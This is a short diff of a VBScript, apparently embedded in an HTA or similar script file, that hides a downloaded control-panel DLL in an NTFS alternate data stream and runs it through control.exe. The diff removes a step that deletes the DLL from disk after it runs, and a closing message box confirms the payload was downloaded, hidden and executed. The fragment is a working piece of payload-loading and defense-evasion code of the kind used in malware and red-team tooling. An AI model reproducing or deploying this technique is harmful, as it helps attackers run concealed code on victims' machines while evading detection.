@@ -38,10 +38,5 @@ shell.Run "cmd /c type """ & filename & """ > """ & hostFile & ":" & adsName & "
 ' Execute CPL from ADS using control.exe
 shell.Run "control.exe """ & hostFile & ":" & adsName & """", 1, False
 
-' Delete the DLL from disk after execution
-If fso.FileExists(filename) Then
-    fso.DeleteFile filename, True
-End If
-
 MsgBox "CPL downloaded, stored in ADS, and executed with control.exe."
 </script>
